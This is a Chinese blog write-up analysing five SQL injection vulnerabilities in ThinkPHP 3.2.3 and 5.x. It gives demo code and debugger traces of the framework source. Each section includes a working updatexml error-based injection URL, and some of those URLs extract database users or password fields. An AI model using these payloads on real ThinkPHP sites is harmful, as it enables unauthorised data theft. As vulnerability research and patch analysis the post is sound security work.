---
title: ThinkPHP 漏洞分析集合
date: 2018-09-24 14:37:28
tags:
	- 漏洞分析
	- ThinkPHP
	- 代码审计
---

# ThinkPHP 5.0.9 鸡肋SQL注入

虽说鸡肋，但是原理还是很值得深思的，而且也能靠报错获取一手数据库信息。

## 漏洞利用

先从官网下载版本为`5.0.9`的thinkphp，然后创建一个demo应用，这里直接借鉴的p神vulhub中的代码和数据

https://github.com/vulhub/vulhub/tree/master/thinkphp/in-sqlinjection/www （ 不直接用docker环境是为了方便后期调试溯源

还有一个点就是thinkphp默认是开启debug模式的，就会显示尽可能多的报错信息，也是利用这个才能获取到数据库信息。这个感觉其实也怪不了官网，毕竟本身就是个框架，开发过程中debug是刚需，而且官方手册也一再强调过要在生产环境要关闭debug，即使默认关闭觉得也不缺乏直接debug环境上线的程序员 :dizzy_face:



再有就是说明一下index.php中的代码

```php
public function index()
{
    $ids = input('ids/a');
    $t = new User();
    $result = $t->where('id', 'in', $ids)->select();
    foreach($result as $row) {
        echo "<p>Hello, {$row['username']}</p>";
    }
}
```

重点在于`$ids = input('ids/a');`，这也是触发漏洞一个关键，至于是什么意思呢可以查看官方手册得到答案

![](ThinkPHP-漏洞分析集合\1.png)

就是以数组的形式接受参数。

最后，可以开始真正的攻击了，访问如下url

```
http://localhost/tp5.0.9/public/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1
```

即可得到sql语句的报错



![](ThinkPHP-漏洞分析集合\2.png)

在下面还能报错出数据库的配置信息

![](ThinkPHP-漏洞分析集合\3.png)

那为什么说鸡肋呢，因为之只能通过报错获取类似于`database()`、`user()`这类信息，而不支持子查询



## 漏洞分析

在一开始下好断点，跟进`$t->where('id', 'in', $ids)->select()`语句

一开始先调用了`thinkphp\library\think\db\Query.php:2277`的`select`方法

然后跟进2306行处的`$sql = $this->builder->select($options);`

然后来到664行

```php
public function select($options = [])
{
    $sql = str_replace(
        ['%TABLE%', '%DISTINCT%', '%FIELD%', '%JOIN%', '%WHERE%', '%GROUP%', '%HAVING%', '%ORDER%', '%LIMIT%', '%UNION%', '%LOCK%', '%COMMENT%', '%FORCE%'],
        [
            $this->parseTable($options['table'], $options),
            $this->parseDistinct($options['distinct']),
            $this->parseField($options['field'], $options),
            $this->parseJoin($options['join'], $options),
            $this->parseWhere($options['where'], $options),
            $this->parseGroup($options['group']),
            $this->parseHaving($options['having']),
            $this->parseOrder($options['order'], $options),
            $this->parseLimit($options['limit']),
            $this->parseUnion($options['union']),
            $this->parseLock($options['lock']),
            $this->parseComment($options['comment']),
            $this->parseForce($options['force']),
        ], $this->selectSql);
    return $sql;
}
```

在这里调用了一次`$this->parseWhere($options['where'], $options)`解析

```php
protected function parseWhere($where, $options)
{
    $whereStr = $this->buildWhere($where, $options);
	....
}
```

跟进第一行的`$whereStr = $this->buildWhere($where, $options);`

然后来到下面的`buildWhere`函数中，最后进入到282行附近的如下语句

```php
} else {
    // 对字段使用表达式查询
    $field = is_string($field) ? $field : '';
    $str[] = ' ' . $key . ' ' . $this->parseWhereItem($field, $value, $key, $options, $binds);
}
```

重点就在`$this->parseWhereItem`中，也就是在这里进行了对`in`的处理，来看下这个函数

由于代码太多，只贴一部分重要的相关处理逻辑

```php
protected function parseWhereItem($field, $val, $rule = '', $options = [], $binds = [], $bindName = null)
{
	....
    $bindName = $bindName ?: 'where_' . str_replace(['.', '-'], '_', $field);
    if (preg_match('/\W/', $bindName)) {
        // 处理带非单词字符的字段名
        $bindName = md5($bindName);
    }

	....
    } elseif (in_array($exp, ['NOT IN', 'IN'])) {
        // IN 查询
        if ($value instanceof \Closure) {
            $whereStr .= $key . ' ' . $exp . ' ' . $this->parseClosure($value);
        } else {
            $value = is_array($value) ? $value : explode(',', $value);
            if (array_key_exists($field, $binds)) {
                $bind  = [];
                $array = [];
                foreach ($value as $k => $v) {
                    if ($this->query->isBind($bindName . '_in_' . $k)) {
                        $bindKey = $bindName . '_in_' . uniqid() . '_' . $k;
                    } else {
                        $bindKey = $bindName . '_in_' . $k;
                    }
                    $bind[$bindKey] = [$v, $bindType];
                    $array[]        = ':' . $bindKey;
                }
                $this->query->bind($bind);
                $zone = implode(',', $array);
            } else {
                $zone = implode(',', $this->parseValue($value, $field));
            }
            $whereStr .= $key . ' ' . $exp . ' (' . (empty($zone) ? "''" : $zone) . ')';
        }
    } 
	....
    return $whereStr;
}
```

可以看到一开始其实是对传入的参数进行了正则匹配处理的，但是由于传入的是一个数组，也就绕过了这个匹配

可以看到之后就将数组中的值遍历出来，然后将key值拼接到SQL语句中

![](ThinkPHP-漏洞分析集合\4.png)

最终的`$whereStr`值为

```sql
`id` IN (:where_id_in_0,updatexml(0,concat(0xa,user()),0))
```

从而导致在编译SQL语句的时候发生错误，从而产生报错。

这也就意味着我们控制了PDO预编译过程中的键名，这里有个疑问就是为什么不能用子查询呢？

引用下p神的文章 https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html

> 通常，PDO预编译执行过程分三步：
>
> 1. `prepare($SQL)` 编译SQL语句
> 2. `bindValue($param, $value)` 将value绑定到param的位置上
> 3. `execute()` 执行
>
> 这个漏洞实际上就是控制了第二步的`$param`变量，这个变量如果是一个SQL语句的话，那么在第二步的时候是会抛出错误的。
>
> 但实际上，在预编译的时候，也就是第一步即可利用。
>
> 究其原因，是因为我这里设置了`PDO::ATTR_EMULATE_PREPARES => false`。
>
> 这个选项涉及到PDO的“预处理”机制：因为不是所有数据库驱动都支持SQL预编译，所以PDO存在“模拟预处理机制”。如果说开启了模拟预处理，那么PDO内部会模拟参数绑定的过程，SQL语句是在最后`execute()`的时候才发送给数据库执行；如果我这里设置了`PDO::ATTR_EMULATE_PREPARES => false`，那么PDO不会模拟预处理，参数化绑定的整个过程都是和Mysql交互进行的。
>
> 非模拟预处理的情况下，参数化绑定过程分两步：第一步是prepare阶段，发送带有占位符的sql语句到mysql服务器（parsing->resolution），第二步是多次发送占位符参数给mysql服务器进行执行（多次执行optimization->execution）。
>
> 这时，假设在第一步执行`prepare($SQL)`的时候我的SQL语句就出现错误了，那么就会直接由mysql那边抛出异常，不会再执行第二步。

在ThinkPHP中也能明显看到`PDO::ATTR_EMULATE_PREPARES`这个选项是默认关闭的

```php
// PDO连接参数
protected $params = [
    PDO::ATTR_CASE              => PDO::CASE_NATURAL,
    PDO::ATTR_ERRMODE           => PDO::ERRMODE_EXCEPTION,
    PDO::ATTR_ORACLE_NULLS      => PDO::NULL_NATURAL,
    PDO::ATTR_STRINGIFY_FETCHES => false,
    PDO::ATTR_EMULATE_PREPARES  => false,
];
```

这样，在执行预编译的编译SQL语句阶段mysql就会报错，但并没有与数据交互，所以只能爆出类似于`user()`、`database()`这类最基础的信息，而不能进行子查询。

最后，膜一下p神对于这种底层机制的深入研究，从最根本的原理层面去剖析这种问题。

关于这个漏洞可以触发的点除了`in`还有一些例如`like`、`not like`、`not in`

框架采用的PDO机制可以说从根本上已经解决了一大堆SQL方面的安全问题，但往往有时就是对安全的过于信任，导致这里是在参数绑定的过程中产生了注入，不过PDO也可以说是将危害降到了最小。



# ThinkPHP 5.0.15 update/insert 注入

## 漏洞利用

从官网下载`ThinkPHP5.0.15`，在`application/index/controller/Index.php`中插入

```php
public function index()
{
    $username = input('get.username/a');
    $res = db('user')->where(['id'=> 1])->insert(['username'=>$username]);
    var_dump($res);
}
```

依旧是以数组的形式接受参数

然后创建一个简单的`user`表

![](ThinkPHP-漏洞分析集合\5.png)

然后在`database.php`配置好数据库信息，最后打在`congfig.php`中将`app_debug`开为`true`。（应该是前一个5.0.9的漏洞原因修改了默认设置吧

最后访问如下url，即可产生sql注入（虽然还是鸡肋型的

```
http://localhost/tp5.0.15/public/index.php
?username[0]=inc
&username[1]=updatexml(1,concat(0x7,user(),0x7e),1)
&username[2]=1
```

![](ThinkPHP-漏洞分析集合\6.png)

## 漏洞分析

在`$res = db('user')->where(['id'=> 1])->insert(['username'=>$username]);`下好断点后进入

跟随到`insert`函数中`thinkphp/library/think/db/Query.php:2079`

```php
public function insert(array $data = [], $replace = false, $getLastInsID = false, $sequence = null)
{
    // 分析查询表达式
    $options = $this->parseExpress();
    $data    = array_merge($options['data'], $data);
    // 生成SQL语句
    $sql = $this->builder->insert($data, $options, $replace);
    ....
```

跟进`$sql = $this->builder->insert($data, $options, $replace);`

然后跟进到第一行的`$data = $this->parseData($data, $options);`中看看是如何解析数据的

```php
protected function parseData($data, $options)
{
    if (empty($data)) {
        return [];
    }

    // 获取绑定信息
    $bind = $this->query->getFieldsBind($options['table']);
    if ('*' == $options['field']) {
        $fields = array_keys($bind);
    } else {
        $fields = $options['field'];
    }

    $result = [];
    foreach ($data as $key => $val) {
        $item = $this->parseKey($key, $options);
        if (is_object($val) && method_exists($val, '__toString')) {
            // 对象数据写入
            $val = $val->__toString();
        }
        if (false === strpos($key, '.') && !in_array($key, $fields, true)) {
		....
        } elseif (is_array($val) && !empty($val)) {
            switch ($val[0]) {
                case 'exp':
                    $result[$item] = $val[1];
                    break;
                case 'inc':
                    $result[$item] = $this->parseKey($val[1]) . '+' . floatval($val[2]);
                    break;
                case 'dec':
                    $result[$item] = $this->parseKey($val[1]) . '-' . floatval($val[2]);
                    break;
            }
        } elseif (is_scalar($val)) {
		....
        }
    }
    return $result;
}
```

对传入的`$data`变量进行遍历，当`$val[0]=='inc'`时，就会将`$val[1]`与`$val[2]`拼接

![](ThinkPHP-漏洞分析集合\7.png)

（本意应该是生成一个
```
INSERT INTO `user` (`username`) VALUES ( username+1 ) 
```
这类似的语句

但是这里没有对拼接的参数进行验证，导致恶意sql语句被拼接，从而引发sql注入

![](ThinkPHP-漏洞分析集合\8.png)

除了`insert`方法还有`update`也能触发该漏洞

## 漏洞修复

官方给出的修复方式是连接前对`$val[1]`进行一次判断

![](ThinkPHP-漏洞分析集合\9.png)

只有当`$val[1]==$key`键值时才能进行拼接（那万一要执行
```
INSERT INTO `user` (`age`) VALUES ( oldage+1 ) 
```
呢？



# ThinkPHP 5.1.22 order by 注入

同时受到影响的还有3.2.3及以下的版本，这里仅以5.1.22进行分析

## 漏洞利用

下载好对应版本的ThinkPHP之后，创建一个demo页面

```php
public function index()
{
    $data=array();
    $data['username']=array('eq','admin');
    $order=input('get.order');
    $m=db('user')->where($data)->order($order)->find();
    dump($m);        
}
```

数据库

![](ThinkPHP-漏洞分析集合\10.png)

设置好对应的数据库配置，以及开启`debug`模式

访问如下url即可产生注入

```
http://localhost/tp5.1.22/public/?order[id`|updatexml(1,concat(0x3a,user()),1)%23]=1
```

![](ThinkPHP-漏洞分析集合\11.png)

## 漏洞分析

在数据库处理的地方下好断点，跟入数据库的操作，可以来到`order`函数中（`thinkphp\library\think\db\Query.php:1823`）

有很多代码区域都没有进入，所以只贴上相关的代码

动态调试中，就主要经过了这几个点

```php
public function order($field, $order = null)
{
	....
    if (!isset($this->options['order'])) {
        $this->options['order'] = [];
    }

    if (is_array($field)) {
        $this->options['order'] = array_merge($this->options['order'], $field);
    } else {
        ....
    }

    return $this;
}
```

![](ThinkPHP-漏洞分析集合\12.png)

可以看到，当`$field`是一个数组的时候，直接用`array_merge`进行了数组拼接，没有进行任何过滤

所以导致键名直接拼接到了语句中，从而在预编译阶段报错

![](ThinkPHP-漏洞分析集合\13.png)

最后还是和其他SQL注入类似，由于PDO的原因，导致无法进行子查询



# ThinkPHP 3.2.3 where注入

终于找到一个支持子查询的SQL注入了，估摸着应该是3和5版本的区别（感觉tp5中的注入都是蛮鸡肋的，但思路值得学习

## 漏洞利用

下载`3.2.3`版本的ThinkPHP，在`IndexController.class.php`中创建一个demo

```php
public function index(){
    $data = M('user')->find(I('GET.id'));
    var_dump($data);
}
```

创建好`user`表以及`id`、`username`、`password`字段，然后配置好`config.php`文件

```php
<?php
return array(
	//'配置项'=>'配置值'
	'DB_TYPE'			=>	'mysql',
	'DB_HOST'			=>	'localhost',
	'DB_NAME'			=>	'tp5',
	'DB_USER'			=>	'root',
	'DB_PWD'			=>	'',
	'DB_PORT'			=>	'3306',
	'DB_FIELDS_CACHE' 	=>	true,
	'SHOW_PAGE_TRACE' 	=>	true,
);
```

访问`http://localhost/tp3.2.3/index.php?id=1`就可以看到数据被取出

![](ThinkPHP-漏洞分析集合\14.png)

然后访问如下url即可产生注入

```
http://localhost/tp3.2.3/index.php?id[where]=3 and 1=updatexml(1,concat(0x7,(select password from user limit 1),0x7e),1)%23
```

![](ThinkPHP-漏洞分析集合\15.png)

## 漏洞分析

通过payload可以看到还是利用数组的形式进行传参，从而造成了sql注入，感觉一般都是在数组这层，对数据的过滤不够严谨，导致的字符串拼接，从而sql注入

在`$data = M('user')->find(I('GET.id'));`中下好断点，跟踪到`ThinkPHP/Library/Think/Model.class.php:720`的`select `函数中

只列出两条比较重要的语句

```php
public function find($options=array()) {
	....
    // 分析表达式
    $options            =   $this->_parseOptions($options);
	....
    $resultSet          =   $this->db->select($options);
	.....
}
```

在一开始的`$this->_parseOptions($options);`中，本来是对传入的pk进行了类型转换，导致无法进行sql注入

```php
protected function _parseOptions($options=array()) {
	....
    // 字段类型验证
    if(isset($options['where']) && is_array($options['where']) && !empty($fields) && !isset($options['join'])) {
        // 对数组查询条件进行字段类型检查
        foreach ($options['where'] as $key=>$val){
            $key            =   trim($key);
            if(in_array($key,$fields,true)){
                if(is_scalar($val)) {
                    $this->_parseType($options['where'],$key);
                }
            }elseif(!is_numeric($key) && '_' != substr($key,0,1) && false === strpos($key,'.') && false === strpos($key,'(') && false === strpos($key,'|') && false === strpos($key,'&')){
                if(!empty($this->options['strict'])){
                    E(L('_ERROR_QUERY_EXPRESS_').':['.$key.'=>'.$val.']');
                } 
                unset($options['where'][$key]);
            }
        }
    }
	...
}
```

但是由于传入的是数组的原因，导致略过了类型转换部分，从而将恶意语句带入了下文中

![](ThinkPHP-漏洞分析集合\16.png)

然后最后被带入到`$this->db->select($options);`

```php
public function select($options=array()) {
    $this->model  =   $options['model'];
    $this->parseBind(!empty($options['bind'])?$options['bind']:array());
    $sql    = $this->buildSelectSql($options);
    $result   = $this->query($sql,!empty($options['fetch_sql']) ? true : false);
    return $result;
}
```

跟入到`$sql    = $this->buildSelectSql($options);`中

```php
public function buildSelectSql($options=array()) {
    if(isset($options['page'])) {
        // 根据页数计算limit
        list($page,$listRows)   =   $options['page'];
        $page    =  $page>0 ? $page : 1;
        $listRows=  $listRows>0 ? $listRows : (is_numeric($options['limit'])?$options['limit']:20);
        $offset  =  $listRows*($page-1);
        $options['limit'] =  $offset.','.$listRows;
    }
    $sql  =   $this->parseSql($this->selectSql,$options);
    return $sql;
}
```

再到`$sql  =   $this->parseSql($this->selectSql,$options);`

```php
public function parseSql($sql,$options=array()){
    $sql   = str_replace(
        array('%TABLE%','%DISTINCT%','%FIELD%','%JOIN%','%WHERE%','%GROUP%','%HAVING%','%ORDER%','%LIMIT%','%UNION%','%LOCK%','%COMMENT%','%FORCE%'),
        array(
            $this->parseTable($options['table']),
            $this->parseDistinct(isset($options['distinct'])?$options['distinct']:false),
            $this->parseField(!empty($options['field'])?$options['field']:'*'),
            $this->parseJoin(!empty($options['join'])?$options['join']:''),
            $this->parseWhere(!empty($options['where'])?$options['where']:''),
            $this->parseGroup(!empty($options['group'])?$options['group']:''),
            $this->parseHaving(!empty($options['having'])?$options['having']:''),
            $this->parseOrder(!empty($options['order'])?$options['order']:''),
            $this->parseLimit(!empty($options['limit'])?$options['limit']:''),
            $this->parseUnion(!empty($options['union'])?$options['union']:''),
            $this->parseLock(isset($options['lock'])?$options['lock']:false),
            $this->parseComment(!empty($options['comment'])?$options['comment']:''),
            $this->parseForce(!empty($options['force'])?$options['force']:'')
        ),$sql);
    return $sql;
}
```

可以看到是将`option`中的字段字节直接在sql语句中进行了拼接，而且从这也能看出，不仅仅有`where`还有以些`tables`、`field`之类的字段都可以控制，因为也会被直接拼接到语句中

![](ThinkPHP-漏洞分析集合\17.png)

然后语句被执行，引发了报错注入

该漏洞涉及到`select`、`find`、`delete`等方法

## 漏洞修复

![](ThinkPHP-漏洞分析集合\19.png)

新的版本中将`$options`和`$this->options`进行了区分，从而传入的参数无法污染到`$this->options`，也就无法控制sql语句了。

# ThinkPHP 3.2.3 bind 注入

## 漏洞利用

demo页面

```php
public function index(){
    $User = M("user");
    $user['id'] = I('id');
    $data['username'] = I('username');
    $data['password'] = I('password');
    $valu = $User->where($user)->save($data);
    var_dump($valu);
}
```

还有数据库和`config.php`配置一下

访问`http://localhost/tp3.2.3/index.php?username=admin&password=123&id=1`看到

![](ThinkPHP-漏洞分析集合\20.png)

就表示成功`update`了一条语句，然后访问

```
http://localhost/tp3.2.3/index.php
?username=admin
&password=123
&id[]=bind
&id[]=1 and updatexml(1,concat(0x7,(select password from user limit 1),0x7e),1)
```

![](ThinkPHP-漏洞分析集合\21.png)

即可看到报错

## 漏洞分析

漏洞的重点就在于参数中的`id[]=bind`，我们只要跟踪由于这个引起的变化，就能看到漏洞触发的全过程。

来到`ThinkPHP/Library/Think/Model.class.php:396` save函数中（很多代码无用被缩了起来

![](ThinkPHP-漏洞分析集合\26.png)

获取了表名字段名一些准备工作之后会进入`$this->db->update($data,$options);`

最后会来到`parseWhere`的解析

![](ThinkPHP-漏洞分析集合\27.png)

到目前位置传入的`options`中的`where`条件依旧是传入的数组

![](ThinkPHP-漏洞分析集合\28.png)

漏洞重点在于`ThinkPHP/Library/Think/Db/Driver.class.php:547`中

![](ThinkPHP-漏洞分析集合\22.png)

当`'bind'==$exp`的时候，就会直接将key和value拼接到where表达式中（本意应该只是生成占位符

![](ThinkPHP-漏洞分析集合\23.png)

导致最后sql语句变为

```sql
UPDATE `user` SET `username`=:0,`password`=:1 WHERE `id` = :1 and updatexml(1,concat(0x7,(select password from user limit 1),0x7e),1)
```

在最后`execute`时，就只会替换`:1`部分的数据

`ThinkPHP/Library/Think/Db/Driver.class.php:196 `

```php
public function execute($str,$fetchSql=false) {
    $this->initConnect(true);
    if ( !$this->_linkID ) return false;
    $this->queryStr = $str;
    if(!empty($this->bind)){
        $that   =   $this;
        $this->queryStr =   strtr($this->queryStr,array_map(function($val) use($that){ return '\''.$that->escapeString($val).'\''; },$this->bind));
    }
    ...
```

![](ThinkPHP-漏洞分析集合\25.png)

导致后面的`and updatexml(1,concat(0x7,(select password from user limit 1),0x7e),1)`语句逃逸，从而产生SQL注入

## 漏洞修复

修复方案只是在`I`函数的过滤器上加入了对于`bind`的过滤

![](ThinkPHP-漏洞分析集合\29.png)

emmm，有点不知道怎么评论
























# Reference Links

https://xz.aliyun.com/t/125

https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html

https://github.com/vulhub/vulhub

http://www.zerokeeper.com/vul-analysis/thinkphp-framework-50x-sql-injection-analysis.html

https://xz.aliyun.com/t/2257

http://galaxylab.org/thinkphp-3-x-5-x-order-by%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/

https://xz.aliyun.com/t/2631

https://xz.aliyun.com/t/2629#toc-5

https://www.anquanke.com/post/id/104847